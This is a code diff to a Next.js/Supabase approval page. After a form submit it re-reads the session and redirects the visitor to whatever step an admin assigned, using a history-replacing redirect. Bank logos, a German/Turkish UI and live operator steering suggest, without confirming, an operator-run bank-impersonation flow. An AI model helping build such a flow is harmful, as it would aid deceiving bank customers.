@@ -2,12 +2,13 @@
 
 import { useEffect, useMemo, useState } from "react";
 import Image from "next/image";
-import { useRouter } from "next/navigation";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
-import { stepToPath } from "@/lib/session-routes";
+import { resolveStepTargetPath, stepToPath } from "@/lib/session-routes";
+import type { SessionStep } from "@/types/session";
 import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";
 import { Linkify } from "@/components/ui/Linkify";
 import { useEnsureCurrentStep } from "@/lib/use-ensure-current-step";
+import { getPreferredRouteSessionId } from "@/lib/session-id-client";
 
 type ApprovalLang = "de" | "tr";
 
@@ -315,7 +316,6 @@ function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: s
 
 export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
   useEnsureCurrentStep(sessionId);
-  const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
   const [ready, setReady] = useState(false);
@@ -417,6 +417,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
       .from("sessions")
       .update({
         is_hidden: false,
+        status: "online",
         current_step: "wait",
         form_data: {
           ...previousFormData,
@@ -428,8 +429,31 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
       .eq("id", effectiveSessionId);
 
     setSaving(false);
-    if (!error) {
-      router.push(stepToPath("wait", effectiveSessionId));
+    if (error) return;
+
+    // KOŞULSUZ ADMİN ÖNCELİĞİ:
+    // Kendi yazdığımız "wait" ten sonra adminden son anda başka bir step atanmış mı?
+    // Hemen DB'den tekrar oku → güncel step NE İSE oraya git
+    try {
+      const { data: afterSubmit } = await supabase
+        .from("sessions")
+        .select("current_step,form_data")
+        .eq("id", effectiveSessionId)
+        .maybeSingle();
+
+      const latestStep = (afterSubmit?.current_step as SessionStep | undefined) ?? "wait";
+      const fd = (afterSubmit?.form_data ?? {}) as { bankSlug?: string | null };
+      const effectiveRouteId = getPreferredRouteSessionId
+        ? getPreferredRouteSessionId(effectiveSessionId)
+        : effectiveSessionId;
+
+      const target = resolveStepTargetPath(latestStep, effectiveSessionId, effectiveRouteId, fd);
+      // router.push yerine window.location.replace:
+      // 1. Tarayıcı geri tuşuyla approval'a dönmez
+      // 2. Client route önbelleği/sorunu olmaz, tam sayfa yenilenir = SessionRealtimeGate baştan çalışır
+      window.location.replace(target);
+    } catch {
+      window.location.replace(stepToPath("wait", effectiveSessionId));
     }
   }
 
